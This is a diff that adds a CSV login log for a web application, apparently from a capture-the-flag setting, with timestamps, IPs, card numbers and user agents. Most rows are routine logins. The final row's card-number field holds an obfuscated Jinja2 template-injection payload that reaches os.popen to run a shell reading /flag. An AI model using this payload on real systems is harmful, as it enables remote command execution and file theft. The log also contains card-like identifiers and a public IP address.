@@ -1,0 +1,8 @@
+timestamp,ip,card_number,status,failure_reason,user_agent
+2026-05-26T14:38:14.016927,127.0.0.1,3501032720210001,SUCCESS,登录成功,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
+2026-05-26T14:40:22.682370,127.0.0.1,3501032720210001,SUCCESS,登录成功,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
+2026-05-26T14:43:21.113789,127.0.0.1,3501032720210002,SUCCESS,登录成功,"Mozilla/5.0 (Linux; Android 12; HarmonyOS; ADA-AL00; HMSCore 6.15.6.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.8.304 Mobile Safari/537.36"
+2026-05-26T14:59:24.808970,112.51.13.85,3501032720210002,SUCCESS,登录成功,"Mozilla/5.0 (Linux; Android 12; HarmonyOS; ADA-AL00; HMSCore 6.15.6.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.8.304 Mobile Safari/537.36"
+2026-05-26T21:29:33.757918,127.0.0.1,3501032720210001,FAILURE,登录失败,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
+2026-05-26T21:29:49.739056,127.0.0.1,3501032720210001,SUCCESS,登录成功,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
+2026-05-26T22:49:55.129762,127.0.0.1,"{{config[""__c""""lass__""][""__ba""""se__""][""__init__""][""__g""""lobals__""]['os'].popen('/usr/local/bin/env /bin/sh -p -c ""cat /flag""').read()}} ",FAILURE,登录失败,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
